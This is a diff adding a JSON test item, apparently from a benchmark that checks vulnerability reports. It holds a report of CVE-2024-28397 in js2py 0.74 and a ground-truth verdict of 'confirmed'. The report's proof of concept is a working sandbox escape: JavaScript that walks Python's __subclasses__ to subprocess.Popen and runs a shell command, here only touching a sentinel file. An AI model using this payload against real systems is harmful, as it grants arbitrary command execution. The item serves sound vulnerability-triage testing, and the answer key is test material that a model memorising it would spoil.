@@ -1,0 +1,19 @@
+{
+  "report": {
+    "report_id": "js2py-affected",
+    "package": "js2py",
+    "affected_version": "0.74",
+    "title": "Sandbox escape to arbitrary Python in js2py disable_pyimport",
+    "body": "I found a vulnerability in this package. the disable_pyimport sandbox is escapable via __subclasses__ to subprocess.Popen.\n\nTracked as CVE-2024-28397.\n\nProof of concept:\n\n```python\nimport os, tempfile, js2py\nsentinel = os.path.join(tempfile.gettempdir(), \"slopgate_js2py\")\ntry: os.remove(sentinel)\nexcept OSError: pass\njs2py.disable_pyimport()\ncmd = \"touch \" + sentinel\npayload = \"\"\"\nlet cmd = \"%s\"\nlet hacked, bymarve, n11, getattr, obj\nhacked = Object.getOwnPropertyNames({})\nbymarve = hacked.__getattribute__\nn11 = bymarve(\"__getattribute__\")\nobj = n11(\"__class__\").__base__\ngetattr = obj.__getattribute__\nfunction findpopen(o) {\n    let result;\n    for (let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n        if (item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") { return item }\n        if (item.__name__ != \"type\" && (result = findpopen(item))) { return result }\n    }\n}\nfindpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()\n\"\"\" % cmd\ntry: js2py.eval_js(payload)\nexcept Exception as e: print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(sentinel) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher",
+    "ecosystem": "python"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "js2py",
+    "fixed_version": null,
+    "cve": "CVE-2024-28397",
+    "source": "GHSA/NVD",
+    "note": "real vuln, affected version (sandbox-verified)"
+  }
+}
